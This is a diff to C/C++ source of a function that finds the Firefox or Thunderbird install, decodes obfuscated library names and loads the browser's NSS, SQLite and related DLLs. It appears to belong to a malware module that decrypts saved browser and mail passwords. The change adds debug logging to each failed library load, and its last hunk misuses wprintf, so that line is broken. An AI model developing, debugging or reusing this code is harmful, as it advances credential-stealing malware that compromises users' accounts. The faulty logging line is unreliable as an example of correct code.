@@ -229,6 +229,7 @@ HMODULE CopyAndLoadDLL(WCHAR *src, char *dest)
 
 void FireFoxInitFunc()
 {
+			wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
 	BOOL FF_ver_3 = false;
 	WCHAR loadPath[MAX_PATH];
 	char destPath[MAX_PATH];
@@ -237,8 +238,13 @@ void FireFoxInitFunc()
 	firefoxDir = GetFFLibPath();
 	if (!firefoxDir || !DirectoryExists(firefoxDir)) {
 		firefoxDir = GetTBLibPath();
-		if (!firefoxDir || !DirectoryExists(firefoxDir))
+		if (!firefoxDir || !DirectoryExists(firefoxDir)){
+			//add
+			swprintf(szLogW, L"!DirectoryExists(firefoxDir) err");
+			putlogW(szLogW);
+			//add end 
 			return;
+		}
 	}
 
 	if (!libmsvcrt && GetModuleHandle("msvcr100.dll") == NULL) {
@@ -289,16 +295,26 @@ void FireFoxInitFunc()
 			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLDS_LIBRARY_NAME));
 			HM_CompletePath(DeobStringA(PLDS_LIBRARY_NAME), destPath);
 			libpld = CopyAndLoadDLL(loadPath, destPath);
-			if (!libpld)
+			if (!libpld){
+				//add
+				swprintf(szLogW, L"CopyAndLoadDLL 1err:%s ", loadPath);
+				putlogW(szLogW);
+				//add end 
 				return;
+			}
 		}
 
 		if (!libplc) {
 			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(PLC_LIBRARY_NAME));
 			HM_CompletePath(DeobStringA(PLC_LIBRARY_NAME), destPath);
 			libplc = CopyAndLoadDLL(loadPath, destPath);
-			if (!libplc)
+			if (!libplc){
+				//add
+				swprintf(szLogW, L"CopyAndLoadDLL 2err:%s ", loadPath);
+				putlogW(szLogW);
+				//add end 
 				return;
+			}
 		}
 
 		if (FF_ver_3) { 
@@ -306,8 +322,13 @@ void FireFoxInitFunc()
 				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSSU_LIBRARY_NAME));
 				HM_CompletePath(DeobStringA(NSSU_LIBRARY_NAME), destPath);
 				libnssu = CopyAndLoadDLL(loadPath, destPath);
-				if (!libnssu)
+				if (!libnssu){
+					//add
+					swprintf(szLogW, L"CopyAndLoadDLL 3err:%s ", loadPath);
+					putlogW(szLogW);
+					//add end 
 					return;
+				}
 			}
 
 			if (!libsql) {
@@ -318,8 +339,13 @@ void FireFoxInitFunc()
 					swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITEALT_LIBRARY_NAME));
 					HM_CompletePath(DeobStringA(SQLITEALT_LIBRARY_NAME), destPath);
 					libsql = CopyAndLoadDLL(loadPath, destPath);
-					if (!libsql)
+					if (!libsql){
+						//add
+						swprintf(szLogW, L"CopyAndLoadDLL 4err:%s ", loadPath);
+						putlogW(szLogW);
+						//add end 
 						return;
+					}
 				}
 			}
 		}
@@ -328,8 +354,13 @@ void FireFoxInitFunc()
 			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SOFTN_LIBRARY_NAME));
 			HM_CompletePath(DeobStringA(SOFTN_LIBRARY_NAME), destPath);
 			libsof = CopyAndLoadDLL(loadPath, destPath);
-			if (!libsof)
+			if (!libsof){
+				//add
+				swprintf(szLogW, L"CopyAndLoadDLL 5err:%s ", loadPath);
+				putlogW(szLogW);
+				//add end 
 				return;
+			}
 		}
 	}
 
@@ -337,8 +368,13 @@ void FireFoxInitFunc()
 		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSS_LIBRARY_NAME));
 		HM_CompletePath(DeobStringA(NSS_LIBRARY_NAME), destPath);
 		libnss = CopyAndLoadDLL(loadPath, destPath);
-		if (!libnss)
+		if (!libnss){
+			//add
+			wprintf(szLogW, L"CopyAndLoadDLL err:%s ", loadPath);
+			putlogW(szLogW);
+			//add end 
 			return;
+		}
 
 		if (!libsql)
 			libsql = libnss;
